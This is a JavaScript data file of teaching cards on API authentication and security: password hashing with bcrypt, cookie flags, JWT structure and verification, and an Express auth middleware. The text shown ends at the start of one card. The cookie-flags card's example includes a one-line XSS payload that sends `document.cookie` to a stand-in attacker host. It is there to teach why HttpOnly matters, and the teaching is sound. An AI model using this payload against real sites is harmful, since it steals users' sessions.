'use strict';
/* Authentication and security: concept cards, rail groups and self-check quiz (bcrypt,
   jsonwebtoken, cors, Zod and helmet on Express as the worked example). Cards explain with
   `html` blocks and `diagram` specs (js/concept-section.js, js/diagram.js); prerequisites are
   linked to their owner cards, not repeated. `hub` and `topic` keys match AUTH_GROUPS and
   AUTH_QUIZ_TOPICS. */

DATA.en.AUTH_QUIZ_TOPICS = {
  identity: 'Authentication and authorisation',
  passwords: 'Password storage',
  tokens: 'Tokens and cookies',
  access: 'Protecting routes',
  cors: 'CORS',
  hardening: 'Hardening the API',
};

DATA.en.AUTH_GROUPS = [
  { key: 'identity', label: 'Who are you, what may you do', icon: 'key' },
  { key: 'passwords', label: 'Passwords', icon: 'lock' },
  { key: 'tokens', label: 'Tokens and cookies', icon: 'doc' },
  { key: 'access', label: 'Protecting routes', icon: 'route' },
  { key: 'cors', label: 'CORS', icon: 'web' },
  { key: 'hardening', label: 'Hardening the API', icon: 'shield' },
];

DATA.en.AUTH_CONCEPTS = [
  /* ---- 1. Who are you, what may you do -------------------------------------------------- */
  { id: 'authn-vs-authz', hub: 'identity', topic: 'identity',
    title: 'Authentication vs authorisation',
    summary: '**Authentication** answers "who is calling?"; **authorisation** answers "may this caller do this, to this resource?". Failing the first gives `401`; failing the second gives `403`.',
    html: [
      '<p>An API asks both questions on every protected request, always in this order: you cannot decide what a caller may do before you know who they are.</p>',
      '<table><caption>The two questions</caption><thead><tr><th scope="col"></th><th scope="col">Authentication</th><th scope="col">Authorisation</th></tr></thead><tbody>'
        + '<tr><th scope="row">Question</th><td>Who is calling?</td><td>May this caller do this to this resource?</td></tr>'
        + '<tr><th scope="row">Evidence</th><td>A password at log-in, then a token or session cookie on every request</td><td>The user id and role from the verified token, plus the resource\'s owner</td></tr>'
        + '<tr><th scope="row">Where in an Express API</th><td>An auth middleware that sets <code>req.user</code> (see <a href="#/server/auth/auth-middleware">The auth middleware</a>)</td><td>Each controller action, or a role middleware (see <a href="#/server/auth/ownership-checks">Ownership and roles</a>)</td></tr>'
        + '<tr><th scope="row">On failure</th><td><code>401</code>: missing, invalid or expired token</td><td><code>403</code>: valid token, not yours or not allowed</td></tr>'
        + '</tbody></table>',
      '<p><code>401 Unauthorized</code> is badly named: it really means <strong>unauthenticated</strong> ("log in first"). <code>403 Forbidden</code> means "I know who you are, and the answer is no", so logging in again will not help (see <a href="#/http/web/common-status-codes">The status codes you will use</a>).</p>',
    ],
    diagram: {
      kind: 'flow',
      numbered: true,
      title: 'Who is calling comes first; what they may do comes second.',
      desc: 'A request arrives. Step 1, authentication: if there is no valid token the API answers 401. Step 2, authorisation: if the caller may not do this to this resource the API answers 403. Step 3: otherwise the route runs and answers, for example 200.',
      nodes: [
        { id: 'who', label: 'Who is calling?', note: 'no valid token: 401', key: true },
        { id: 'may', label: 'May they?', note: 'not allowed: 403' },
        { id: 'ok', label: 'The route runs', note: '200, 201…' },
      ],
      edges: [['who', 'may', 'known'], ['may', 'ok', 'allowed']],
    },
    example: 'A Tasks API\'s `GET /tasks/7`: with no `Authorization` header → **401** `Missing token`; with an expired token → **401**; with Ana\'s valid token when task 7 belongs to Ben → **403**; with Ana\'s token for her own task 7 → **200**; with any valid token for task 999, which does not exist → **404**.',
    mistake: 'Answering `403` for a missing token, or `401` for "not your task". The client reacts to each code differently: on `401` it sends the user to the log-in page; on `403` it shows "not allowed". Mixing them up sends logged-in users to a log-in page that cannot help them.' },

  { id: 'sessions-vs-tokens', hub: 'identity', topic: 'identity',
    title: 'Remembering who you are: sessions vs tokens',
    summary: 'After logging in, the client must prove who it is on **every** request: either with a random **session id** in a cookie, which the server looks up, or with a signed **token** (a JWT) that carries the identity itself.',
    html: [
      '<p>HTTP is stateless: the server does not remember your previous request (see <a href="#/http/api-design/statelessness">Stateless requests</a>). So something must travel with every request. A <strong>session id</strong> means nothing by itself; the server keeps the list of whom each id belongs to (the session store). A <strong>JWT</strong> carries the user id inside, and a signature proves it is genuine, so the server needs no list.</p>',
      '<table><caption>Server sessions vs JWT</caption><thead><tr><th scope="col"></th><th scope="col">Server session</th><th scope="col">JWT</th></tr></thead><tbody>'
        + '<tr><th scope="row">What the client holds</th><td>A random id that means nothing alone</td><td>A signed token with the user id, role and expiry inside</td></tr>'
        + '<tr><th scope="row">Server keeps</th><td>One row per active session</td><td>Nothing (only the signing secret)</td></tr>'
        + '<tr><th scope="row">Each request</th><td>Look the id up in the store</td><td>Verify the signature (no lookup)</td></tr>'
        + '<tr><th scope="row">Log out or ban now</th><td>Delete the row: immediate</td><td>Hard: the token works until it expires (or keep a denylist)</td></tr>'
        + '<tr><th scope="row">Several servers</th><td>Need a shared store (often Redis)</td><td>Work out of the box (same secret)</td></tr>'
        + '<tr><th scope="row">Size</th><td>About 30 characters</td><td>Hundreds of bytes, on every request</td></tr>'
        + '<tr><th scope="row">Usual transport</th><td>A cookie, sent automatically</td><td>An <code>Authorization: Bearer</code> header, added by your code</td></tr>'
        + '</tbody></table>',
      '<p>The choice is a set of trade-offs, not "old vs better". JSON APIs consumed by a separate front end often pick JWTs; server-rendered sites often keep sessions. The next cards cover both carriers: <a href="#/server/auth/cookie-flags">cookies</a> and <a href="#/server/auth/jwt-structure">JWTs</a>.</p>',
    ],
    example: 'Ana clicks "log out". With sessions, the server deletes row `s_8f3a…`, and the next request with the old cookie gets **401** immediately. With JWTs, the front end throws its copy of the token away; but if an attacker had copied it, it keeps working until it expires, up to an hour with `expiresIn: "1h"`.',
    mistake: '"JWTs are more secure than sessions" (or the reverse). Neither is: they move the problem. A stolen JWT works like a password until it expires, and you cannot cancel it easily; a session needs a server-side store that every request must reach.' },

  /* ---- 2. Passwords ------------------------------------------------------------------------- */
  { id: 'hash-not-encrypt', hub: 'passwords', topic: 'passwords',
    title: 'Store a hash, never the password',
    summary: 'A **hash function** turns a password into a fixed-length fingerprint that cannot be turned back into the password; the server stores only the fingerprint and checks a log-in by hashing the attempt again and comparing.',
    html: [
      '<p><strong>Encryption</strong> can be reversed by whoever has the key, and on a web server the key sits on the same machine an attacker breaks into. <strong>Hashing</strong> is <strong>one-way</strong>: you can check whether an attempt matches, but you cannot rebuild the password from the hash. Nobody, not even the server, ever needs to read a password back.</p>',
      '<table><caption>Three ways to keep a password, from worst to right</caption><thead><tr><th scope="col"></th><th scope="col">Plaintext</th><th scope="col">Encrypted</th><th scope="col">Password hash (bcrypt)</th></tr></thead><tbody>'
        + '<tr><th scope="row">Stored value</th><td><code>hunter2</code></td><td>Ciphertext, plus a key on the server</td><td><code>$2b$10$…</code> (60 characters)</td></tr>'
        + '<tr><th scope="row">Can it be turned back?</th><td>It is the password</td><td>Yes, by anyone with the key</td><td>No: it can only be guessed</td></tr>'
        + '<tr><th scope="row">Log-in check</th><td>Compare strings</td><td>Decrypt and compare</td><td>Hash the attempt and compare (<code>bcrypt.compare</code>)</td></tr>'
        + '<tr><th scope="row">After a database leak</th><td>Every password is known</td><td>Every password, if the key leaks too</td><td>Each password must be guessed, slowly</td></tr>'
        + '</tbody></table>',
      '<ul><li><strong>Why it matters:</strong> databases leak (a stolen backup, an injection, a misconfigured admin panel), and people reuse passwords, so a plaintext leak also opens their email and bank accounts.</li>'
        + '<li><strong>Same input, same output:</strong> so the server can compare. <strong>A tiny change, a completely different output:</strong> so a near-miss reveals nothing.</li>'
        + '<li><strong>Not any hash:</strong> MD5, SHA-1 and SHA-256 are built to be fast, which helps the guesser. Password hashes (bcrypt, argon2) add a salt and a cost (see <a href="#/server/auth/salt-and-cost">Salt and cost</a>).</li>'
        + '<li><strong>The hash is sensitive too:</strong> never return it in a response, never put it in a token, and never log request bodies on <code>/auth</code> routes, or the plaintext password ends up in your log files.</li></ul>',
    ],
    example: 'SHA-256 of `hunter2` is `f52fbd32…26a3f6c7`; of `hunter3` it is `fb8c2e2b…21cfa57a`: one character apart, nothing in common. A site whose "forgot password" email sends you **your old password** is storing it reversibly; the right flow emails a one-time reset link instead.',
    mistake: '"Encrypting passwords with a secret key is safer than hashing." It is worse: the key has to live next to the data so the server can decrypt, and an attacker who gets the database usually gets the key too.' },

  { id: 'salt-and-cost', hub: 'passwords', topic: 'passwords',
    title: 'Salt and cost: why bcrypt is slow on purpose',
    summary: 'A **salt** is a random value stored with each hash so that equal passwords get different hashes; a **cost factor** makes each hash deliberately slow, so an attacker can try far fewer guesses per second.',
    html: [
      '<p>An attacker with a stolen users table takes a list of likely passwords (<code>123456</code>, <code>qwerty</code>, <code>ana2005</code>…), hashes each one and looks for it in the table. The <strong>salt</strong> forces them to repeat that work for every user and makes precomputed tables of hash → password ("rainbow tables") useless. The <strong>cost</strong> multiplies the time of every guess: 100 ms is invisible to a user logging in once a day, and turns an attacker\'s billions of guesses from hours into centuries.</p>',
      '<dl><dt><code>bcrypt.hash(password, 10)</code></dt><dd>Generates a fresh random salt and embeds it, with the cost, in a 60-character result. One <code>password_hash</code> column is enough.</dd>'
        + '<dt><code>$2b$10$…</code></dt><dd><code>$2b$</code> is the version, <code>10$</code> the cost, then 22 characters of salt and 31 of hash.</dd>'
        + '<dt>The cost</dt><dd>An exponent: cost 10 means 2^10 rounds, and every +1 <strong>doubles</strong> the time. OWASP asks for at least 10; pick the highest that keeps one log-in at a few hundred milliseconds, and raise it as hardware gets faster (old hashes keep working, because each stores its own cost).</dd>'
        + '<dt><code>bcrypt.compare(attempt, hash)</code></dt><dd>Re-hashes the attempt with the salt and cost stored in the hash: no separate salt needed.</dd>'
        + '<dt>argon2</dt><dd>OWASP\'s first choice today (argon2id): besides time it needs a lot of <strong>memory</strong> per guess, which hurts attackers using graphics cards. bcrypt remains a good default in Node; it uses only the first 72 bytes of a password.</dd></dl>',
    ],
    diagram: {
      kind: 'branch',
      title: 'Each user gets their own salt; the cost sets the price of every guess.',
      desc: 'The password and a fresh random salt go into bcrypt, which runs 2 to the power of the cost rounds. The result is one stored string that contains the version, the cost, the salt and the hash.',
      nodes: [
        { id: 'pw', label: 'The password', note: '`hunter2`' },
        { id: 'salt', label: 'A random salt', note: 'new for every user' },
        { id: 'bcrypt', label: 'bcrypt', note: '2^cost rounds', key: true },
        { id: 'stored', label: 'One stored string', note: '`$2b$10$` salt + hash' },
      ],
      edges: [['pw', 'bcrypt'], ['salt', 'bcrypt'], ['bcrypt', 'stored']],
    },
    code: `// npm install bcrypt (bcryptjs has the same API)
const bcrypt = require('bcrypt');

// sign-up: a new random salt every time
const hash = await bcrypt.hash('correct horse battery staple', 10);
// e.g. '$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy'
//   '$2b$' version · '10$' cost · then 22 chars of salt and 31 chars of hash

// log-in: re-hash the attempt with the salt and cost stored in the hash
await bcrypt.compare('correct horse battery staple', hash);
// → true
await bcrypt.compare('Correct horse battery staple', hash);
// → false`,
    example: 'Two users both choose `123456`. Unsalted SHA-256 stores the same value twice, `8d969eef6ecad3c2…`, and a web search for it reveals the password: crack one, crack both. With bcrypt the two rows look completely unrelated. In the password-hashing tool on this card, hash a password at 2^16 and then 2^18 iterations: the time roughly quadruples, and so does the attacker\'s.',
    mistake: 'Thinking the salt must be kept secret, or storing it "safely" elsewhere. A salt is not a secret: its only job is to be **different for every user**. Using one fixed salt for everybody defeats that job, because equal passwords become equal hashes again.',
    widget: 'hash-cost' },

  /* ---- 3. Tokens and cookies -------------------------------------------------------------- */
  { id: 'cookie-flags', hub: 'tokens', topic: 'tokens',
    title: 'Cookies and their security flags',
    summary: 'A **cookie** is a small `name=value` that a server asks the browser to keep (`Set-Cookie`) and that the browser sends back automatically (`Cookie`); the flags **HttpOnly**, **Secure** and **SameSite** limit who can read it and when it is sent.',
    html: [
      '<p>The browser shows the cookie at every request to that site without your code doing anything. That convenience is also the danger: it sends the cookie even when <strong>another site</strong> makes it call yours. The flags exist to limit that.</p>',
      '<dl><dt><code>HttpOnly</code></dt><dd>JavaScript cannot read the cookie (<code>document.cookie</code> does not show it), so a script injected into the page (XSS, see <a href="#/browser/dom/text-vs-html">textContent vs innerHTML</a>) cannot steal it.</dd>'
        + '<dt><code>Secure</code></dt><dd>Sent only over HTTPS, never over plain HTTP.</dd>'
        + '<dt><code>SameSite</code></dt><dd>Whether the cookie goes along on requests started by another site. <code>Strict</code>: never. <code>Lax</code> (the default in modern browsers): only when the user navigates to your site, such as clicking a link, not on another site\'s background <code>fetch</code> or form POST. <code>None</code>: always, and then <code>Secure</code> is required.</dd>'
        + '<dt><code>Max-Age</code> / <code>Expires</code></dt><dd>How long the browser keeps it. Without them it is a "session cookie", gone when the browser closes.</dd></dl>',
      '<p>The attack SameSite blocks is <strong>CSRF</strong> (cross-site request forgery): a malicious page makes your browser send a request to a site where you are logged in, cookies included, for example a hidden form that posts to <code>/transfer</code>. Tokens in an <code>Authorization</code> header are not sent automatically, so they are not exposed to CSRF; kept in <code>localStorage</code>, though, an XSS can read them.</p>',
    ],
    diagram: {
      kind: 'sequence',
      numbered: true,
      title: 'The server sets the cookie once; the browser sends it back on every request.',
      desc: 'Step 1: the browser posts the log-in. Step 2: the API answers 200 with a Set-Cookie header holding the session id. Step 3: the browser stores the cookie. Step 4: on the next request it sends the Cookie header by itself. Step 5: the API recognises the session and answers with the user\'s data.',
      nodes: [
        { id: 'b', label: 'Browser', key: true },
        { id: 'a', label: 'API' },
      ],
      edges: [
        ['b', 'a', '`POST /auth/login`'],
        ['a', 'b', '200 + `Set-Cookie: sid=…`'],
        ['b', 'b', 'stores the cookie'],
        ['b', 'a', '`GET /api/me` + `Cookie: sid=…`'],
        ['a', 'b', '200 + your data'],
      ],
    },
    code: `// Express 4: after a successful log-in with a server-side session
res.cookie('sid', sessionId, {
  // invisible to JavaScript
  httpOnly: true,
  // HTTPS only
  secure: true,
  // not sent on other sites' fetch / form POSTs
  sameSite: 'lax',
  // in milliseconds here (1 hour)
  maxAge: 60 * 60 * 1000,
});
// Response header:
// Set-Cookie: sid=8f3a…; Max-Age=3600; Path=/; Expires=…; HttpOnly; Secure; SameSite=Lax`,
    example: 'A forum shows comments with `innerHTML`, and someone posts `<img src="x" onerror="fetch(\'https://evil.example/?c=\' + document.cookie)">`. Without HttpOnly, every reader\'s session id is sent to the attacker, who can then act as them. With HttpOnly, `document.cookie` does not contain `sid` and the theft fails (the real fix is still to stop the XSS).',
    mistake: 'Thinking HttpOnly makes a cookie "safe". It stops scripts from **reading** it, but the browser still **sends** it, so CSRF is still possible (that is SameSite\'s job), and an XSS can still make requests as the user from inside the page.' },

  { id: 'jwt-structure', hub: 'tokens', topic: 'tokens',
    title: 'Anatomy of a JWT',
    summary: 'A **JSON Web Token** is three base64url strings joined by dots, `header.payload.signature`: the header names the signing algorithm, the payload holds the **claims** (statements such as the user id and the expiry time), and the signature proves that the first two have not been changed.',
    html: [
      '<p>The header and payload are only <strong>encoded</strong>, not encrypted: anyone can read them. The signature breaks if anyone changes a single character. So a JWT is <strong>readable by everyone and trustworthy only to whoever can check the signature</strong>: the server that holds the secret.</p>',
      '<p><strong>base64url</strong> writes any bytes with 64 URL-safe characters (<code>A–Z a–z 0–9 - _</code>), so the token fits in a header or a URL. Anyone can reverse it (<code>atob</code> in the browser console). It differs from ordinary base64 in two details: <code>-</code> and <code>_</code> replace <code>+</code> and <code>/</code>, and the <code>=</code> padding is dropped.</p>',
      '<table><caption>Claims you will meet (a typical log-in token has sub, role, iat and exp)</caption><thead><tr><th scope="col">Claim</th><th scope="col">Name</th><th scope="col">Meaning</th><th scope="col">Who sets it</th></tr></thead><tbody>'
        + '<tr><th scope="row"><code>sub</code></th><td>Subject</td><td>Who the token is about: the user id. Becomes <code>req.user.sub</code>.</td><td>You: <code>jwt.sign({ sub: user.id, … })</code></td></tr>'
        + '<tr><th scope="row"><code>iat</code></th><td>Issued at</td><td>When it was signed.</td><td><code>jwt.sign</code>, automatically</td></tr>'
        + '<tr><th scope="row"><code>exp</code></th><td>Expiration</td><td>After this moment <code>jwt.verify</code> throws <code>jwt expired</code>.</td><td><code>jwt.sign</code> with <code>expiresIn: "1h"</code>, which sets <code>iat + 3600</code></td></tr>'
        + '<tr><th scope="row"><code>nbf</code></th><td>Not before</td><td>Not valid before this moment.</td><td>Optional (<code>notBefore</code>)</td></tr>'
        + '<tr><th scope="row"><code>iss</code> / <code>aud</code></th><td>Issuer / audience</td><td>Who issued it / who it is meant for.</td><td>Optional</td></tr>'
        + '<tr><th scope="row"><code>role</code></th><td>(your own)</td><td>Lets routes check permissions without a database lookup.</td><td>You</td></tr>'
        + '</tbody></table>',
      '<p>Times are <strong>seconds</strong> since 1 January 1970 UTC ("Unix time"), not milliseconds like <code>Date.now()</code> in JavaScript.</p>',
    ],
    diagram: {
      kind: 'layers',
      title: 'Two readable parts and a signature that seals them.',
      desc: 'A JWT has three parts. The header, readable by anyone, names the algorithm. The payload, readable by anyone, holds the claims such as sub, role and exp. The signature is an HMAC of the header and payload computed with the server\'s secret.',
      nodes: [
        { id: 'h', label: 'Header', note: '`{"alg":"HS256"}`: readable' },
        { id: 'p', label: 'Payload (claims)', note: '`sub`, `role`, `exp`: readable' },
        { id: 's', label: 'Signature', note: 'HMAC with the secret', key: true },
      ],
      edges: [],
    },
    example: 'The example token on jwt.io starts `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`, which decodes to the header `{"alg":"HS256","typ":"JWT"}`. Its payload is `{"sub":"1234567890","name":"John Doe","iat":1516239022}`: `iat` is 18 January 2018, 01:30:22 UTC. It has no `exp`, so it never expires, which you would never do in a real API. Paste it into the JWT inspector on this card and change one character.',
    mistake: 'Putting secrets in the payload ("it is a token, so it is hidden"): a password hash, another user\'s data, an internal API key. Anyone who sees the token can decode it in one line. A second classic: `exp: Date.now() + 3600`, which is in **milliseconds**, so the token expires in about 56,000 years.',
    widget: 'jwt-inspector' },

  { id: 'jwt-sign-verify', hub: 'tokens', topic: 'tokens',
    title: 'Signing and verifying: what the secret does',
    summary: 'With **HS256**, `jwt.sign` computes an HMAC-SHA-256 of `header.payload` using a secret that only the server knows; `jwt.verify` recomputes it and rejects the token if the result differs, if the algorithm is not the expected one, or if the token has expired.',
    html: [
      '<p>The server does not "decrypt" anything: it recomputes the signature and compares. Change one character of the payload and the correct signature is completely different, and without the secret nobody can compute it.</p>',
      '<dl><dt>HMAC</dt><dd>A hash mixed with a secret key.</dd>'
        + '<dt>HS256</dt><dd>HMAC with SHA-256. <strong>Symmetric</strong>: the same secret signs and verifies, so it never leaves the server (it lives in <code>process.env.JWT_SECRET</code>, see <a href="#/server/auth/secrets-env">The signing secret</a>).</dd>'
        + '<dt>RS256</dt><dd>Signs with a private key and verifies with a public key: for when other services must check tokens without being able to create them.</dd></dl>',
      '<ul><li><strong>Signing is not encrypting:</strong> a signature protects <strong>integrity</strong> (nobody changed it), not <strong>confidentiality</strong> (nobody can read it).</li>'
        + '<li><strong><code>"alg": "none"</code></strong> is an unsigned token. Libraries that trusted the header\'s <code>alg</code> once accepted forgeries this way. <code>jsonwebtoken</code> 9 refuses them when you pass a secret; <code>{ algorithms: [\'HS256\'] }</code> makes the rule explicit.</li>'
        + '<li><strong>What <code>jwt.verify</code> throws:</strong> <code>TokenExpiredError</code> (<code>jwt expired</code>), <code>NotBeforeError</code> (<code>jwt not active</code>) or <code>JsonWebTokenError</code> (<code>invalid signature</code>, <code>jwt malformed</code>…).</li></ul>',
    ],
    diagram: {
      kind: 'branch',
      title: 'jwt.verify either returns the payload or throws: there is no "almost valid".',
      desc: 'jwt.verify recomputes the signature with the secret. If it matches and the token has not expired, it returns the payload, which becomes req.user. If the header or payload was changed, it throws invalid signature. If the expiry time has passed, it throws jwt expired. Both errors become a 401.',
      nodes: [
        { id: 'v', label: '`jwt.verify`', note: 'recomputes the signature', key: true },
        { id: 'ok', label: 'The payload', note: 'becomes `req.user`' },
        { id: 'sig', label: 'Throws', note: '`invalid signature`: 401' },
        { id: 'exp', label: 'Throws', note: '`jwt expired`: 401' },
      ],
      edges: [['v', 'ok', 'matches'], ['v', 'sig', 'changed'], ['v', 'exp', 'after `exp`']],
    },
    code: `const jwt = require('jsonwebtoken');

// at log-in
const token = jwt.sign({ sub: user.id, role: user.role }, process.env.JWT_SECRET, { expiresIn: '1h' });

// on every protected request
try {
  const payload = jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] });
  // payload → { sub: 42, role: 'user', iat: 1791158400, exp: 1791162000 }
} catch (err) {
  // err.name → 'TokenExpiredError' | 'NotBeforeError' | 'JsonWebTokenError'
}

// A strong random secret (run once, put the output in .env):
// node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"`,
    example: 'Ana decodes her token, changes `"role":"user"` to `"role":"admin"`, encodes it again and sends it. The server recomputes HMAC-SHA-256 over the new header and payload with its secret; the result does not match the old signature still attached, so `jwt.verify` throws `invalid signature` and the middleware answers **401**. Try it with the **Tamper** button of the inspector.',
    mistake: 'Using `jwt.decode(token)` in the middleware instead of `jwt.verify(token, secret)`. `decode` only reads the payload and checks nothing, so anyone can write a token saying `role: admin`. Another: a short secret such as `secret` or `riverside123`. Anyone holding one token can try millions of candidate secrets offline until the signature matches; use 32 random bytes.',
    practice: { href: '#/server/auth/practice/jwt-inspector', label: 'Sign and verify tokens in the JWT inspector' } },

  { id: 'login-flow', hub: 'tokens', topic: 'tokens',
    title: 'Register and log in, step by step',
    summary: '**Registering** validates the input, hashes the password and stores the user; **logging in** finds the user by email, compares the password with `bcrypt.compare` and, if it matches, issues a signed token that the client sends on later requests.',
    html: [
      '<p>The password is checked <strong>once</strong>, at log-in. From then on the signed token proves who is calling, so the API never needs the password again until the token expires.</p>',
      '<h3>Registering</h3>',
      '<ol><li>Validate: <code>email</code> a non-empty string, <code>password</code> at least 8 characters; otherwise <code>400</code>.</li>'
        + '<li>If the email already exists: <code>409 Conflict</code>.</li>'
        + '<li>Hash with <code>bcrypt.hash(password, 10)</code> and store the user.</li>'
        + '<li>Answer <code>201</code> with <code>{ id, email }</code> only: never the hash.</li></ol>',
      '<h3>Logging in</h3>',
      '<ul><li><strong>One answer for both failures:</strong> no such user, or <code>bcrypt.compare</code> says false, both get <code>401</code> <code>Invalid credentials</code>. Different messages ("no such email" vs "wrong password") let an attacker discover which emails have accounts: <strong>account enumeration</strong>.</li>'
        + '<li><strong>On success:</strong> sign <code>{ sub: user.id, role: user.role }</code> with <code>expiresIn: "1h"</code> and answer <code>200 { token }</code>.</li>'
        + '<li><strong>Both handlers are <code>async</code></strong> (the database and bcrypt return promises): in Express 4 an error after an <code>await</code> must reach <code>next(err)</code> (see <a href="#/server/routes/express-async-errors">Async handlers</a>).</li></ul>',
    ],
    diagram: {
      kind: 'sequence',
      numbered: true,
      title: 'The password is checked once; the token stands in for it afterwards.',
      desc: 'Step 1: the browser posts the email and password to /auth/login. Step 2: the API asks the database for the user by email. Step 3: the database returns the row with the password hash. Step 4: the API runs bcrypt.compare. Step 5: it signs a token with the user id and role. Step 6: it answers 200 with the token. Step 7: on later requests the browser sends the token in the Authorization header.',
      nodes: [
        { id: 'b', label: 'Browser' },
        { id: 'a', label: 'API', key: true },
        { id: 'd', label: 'Database' },
      ],
      edges: [
        ['b', 'a', '`POST /auth/login`'],
        ['a', 'd', 'find user by email'],
        ['d', 'a', 'row with `password_hash`'],
        ['a', 'a', '`bcrypt.compare`'],
        ['a', 'a', '`jwt.sign` the token'],
        ['a', 'b', '200 `{ token }`'],
        ['b', 'a', '`GET /tasks` + Bearer token'],
      ],
    },
    code: `// The heart of the log-in check: one answer for both failure cases.
const user = await usersModel.findByEmail(email);
// → null if unknown
const ok = user !== null && (await bcrypt.compare(password, user.password_hash));
if (!ok) return res.status(401).json({ error: 'Invalid credentials' });
// … sign the token and answer 200 { token }`,
    example: 'Ana registers with `{"email":"ana@example.com","password":"password1"}` → **201** `{"id":1,"email":"ana@example.com"}`. Registering again → **409**. Logging in with `password2` → **401** `Invalid credentials`; with an unknown email → the same **401**. With the right password → **200** `{"token":"eyJhbGciOiJIUzI1NiIs…"}`, which she then sends as `Authorization: Bearer eyJ…` on every `/tasks` request.',
    mistake: 'Calling `bcrypt.compare(password, user.password_hash)` without checking that `user` exists. For an unknown email `user` is `null`, reading `.password_hash` throws a `TypeError`, and the client gets `500` instead of `401` (many tutorial snippets have this bug). Also wrong: `password === user.password_hash`, which compares a password with a hash and is never true.' },

  { id: 'token-transport', hub: 'tokens', topic: 'tokens',
    title: 'Sending and expiring tokens',
    summary: 'The client sends the token on every protected request in the `Authorization: Bearer <token>` header, and the `exp` claim limits how long a stolen copy stays useful.',
    html: [
      '<p><strong>Bearer</strong> means "whoever bears (holds) this token is treated as its owner", with no further proof. So a token is handled like a password: it travels only over HTTPS, never in a URL, and it expires.</p>',
      '<ul><li><strong>The header:</strong> exactly <code>Authorization: Bearer &lt;token&gt;</code>, one space after <code>Bearer</code>.</li>'
        + '<li><strong>Never in a URL:</strong> <code>?token=…</code> ends up in browser history and server logs.</li>'
        + '<li><strong>Expiry is the built-in revocation:</strong> one hour is a common choice. "Logging out" with a JWT means the client deletes its copy; larger apps pair a short-lived token with a revocable <strong>refresh token</strong> in an HttpOnly cookie.</li>'
        + '<li><strong>Where a browser app keeps it</strong> (memory, <code>localStorage</code> or an HttpOnly cookie) is a front-end trade-off: see <a href="#/browser/shared-state/token-storage">Where to keep the token</a>. A cookie also needs <a href="#/server/auth/cors-credentials">CORS with credentials</a>.</li></ul>',
    ],
    code: `// Front end: log in, keep the token, send it back
const login = await fetch('http://localhost:3000/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ email, password }),
});
if (!login.ok) throw new Error('Wrong email or password');
const { token } = await login.json();

const res = await fetch('http://localhost:3000/tasks', {
  headers: { Authorization: \`Bearer \${token}\` },
});
// From a terminal: curl -H "Authorization: Bearer $TOKEN" http://localhost:3000/tasks`,
    example: 'A token signed at 10:00:00 with `expiresIn: "1h"` has `exp` = 11:00:00. A request at 10:59:59 passes; at 11:00:00 exactly `jwt.verify` throws `jwt expired` (the check is "now ≥ exp"), the API answers **401**, and the front end should send the user back to the log-in form. Shift the clock in the [JWT inspector](#/server/auth/practice/jwt-inspector) to watch it happen.',
    mistake: 'Getting the header format wrong: `Authorization: eyJ…` (no `Bearer `), `Bearer: eyJ…` (a header called Bearer), or `?token=eyJ…` in the URL. A typical [auth middleware](#/server/auth/auth-middleware) only accepts a value that starts with `Bearer ` followed by the token, and treats anything else as a missing token (**401**).' },

  /* ---- 4. Protecting routes --------------------------------------------------------------- */
  { id: 'auth-middleware', hub: 'access', topic: 'access',
    title: 'The auth middleware: one gate in front of many routes',
    summary: 'An **auth middleware** runs before the protected routes: it reads the `Authorization` header, verifies the token, stores the decoded payload in `req.user` and calls `next()`, or stops the request with `401`.',
    html: [
      '<p><code>app.use(\'/tasks\', auth, tasksRouter)</code> means no handler inside the tasks router runs unless <code>auth</code> called <code>next()</code>, so every handler behind it can rely on <code>req.user.sub</code> being the caller\'s id. The shape, answer and stop or call <code>next()</code>, is the guard pattern of <a href="#/server/routes/guard-middleware">Guards</a>; what is specific here is reading the <code>Bearer</code> header and <code>jwt.verify</code>.</p>',
      '<table><caption>Three requests to <code>GET /tasks</code></caption><thead><tr><th scope="col">Request header</th><th scope="col">What auth does</th><th scope="col">Result</th></tr></thead><tbody>'
        + '<tr><th scope="row">(none)</th><td><code>token</code> is <code>null</code></td><td><strong>401</strong> <code>Missing token</code>; the router never runs</td></tr>'
        + '<tr><th scope="row"><code>Authorization: Bearer abc</code></th><td><code>jwt.verify</code> throws <code>jwt malformed</code></td><td><strong>401</strong> <code>Invalid or expired token</code></td></tr>'
        + '<tr><th scope="row"><code>Authorization: Bearer eyJ…</code> (valid)</th><td><code>req.user = { sub: 42, role: \'user\', iat, exp }</code>, then <code>next()</code></td><td>The tasks controller runs with <code>req.user</code></td></tr>'
        + '</tbody></table>',
      '<ul><li><strong>Leave the door open where tokens come from:</strong> <code>/auth/register</code> and <code>/auth/login</code> are mounted <strong>without</strong> <code>auth</code>.</li>'
        + '<li><strong><code>cors</code> before <code>auth</code>:</strong> the browser\'s preflight never carries the token (see <a href="#/server/auth/cors-preflight">Preflight requests</a>).</li>'
        + '<li><strong>Only 401 here:</strong> the middleware knows who you are, not what you may do. The 403 decisions belong to the controllers or a role middleware placed after it (see <a href="#/server/auth/ownership-checks">Ownership and roles</a>).</li>'
        + '<li><strong>A plain <code>try</code>/<code>catch</code> is enough:</strong> <code>jwt.verify</code> without a callback is synchronous.</li></ul>',
    ],
    code: `// middleware/auth.js
const jwt = require('jsonwebtoken');

function auth(req, res, next) {
  // Node lower-cases header names
  const header = req.headers.authorization || '';
  const token = header.startsWith('Bearer ') ? header.slice(7) : null;
  if (!token) return res.status(401).json({ error: 'Missing token' });
  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] });
    next();
  } catch (err) {
    res.status(401).json({ error: 'Invalid or expired token' });
  }
}

// app.js
// open: this is where tokens come from
app.use('/auth', authRouter);
// every /tasks route is behind the gate
app.use('/tasks', auth, tasksRouter);`,
    example: 'Ana\'s React page calls `GET /tasks?page=2` with her token. `auth` verifies it and sets `req.user.sub = 1`; the list controller then asks the model for **her** tasks only (`findByOwner(1, { limit, offset })`). Ben\'s token on the same URL gives Ben\'s tasks: same route, different `req.user`.',
    mistake: 'Mounting the gate on the whole app, `app.use(auth)`, above the log-in route. Now `/auth/login` itself demands a token, so nobody can ever get one: every log-in answers **401** `Missing token`. Mount `auth` on the routers it protects, after the open `/auth` router.' },

  { id: 'ownership-checks', hub: 'access', topic: 'access',
    title: 'Ownership and roles: a valid token is not a free pass',
